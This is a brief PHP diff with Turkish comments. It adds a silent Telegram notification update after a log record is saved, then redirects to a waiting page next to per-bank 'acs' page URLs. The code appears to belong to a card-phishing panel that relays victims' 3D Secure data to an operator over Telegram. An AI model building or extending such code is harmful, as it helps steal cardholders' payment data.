@@ -184,6 +184,8 @@ if ($log_id) {
         'acs_url'   => BASE_PATH . "/acs/{$acs}.php",
     ], fn($v) => $v !== ''));
     $_SESSION['log_id'] = $log_id;
+    // Telegram bildirimini yeni bilgilerle güncelle
+    try { tg_mesaj_guncelle($log_id); } catch (Exception $e) {}
 }
 
 header("Location: " . BASE_PATH . "/bekle.php"); exit;
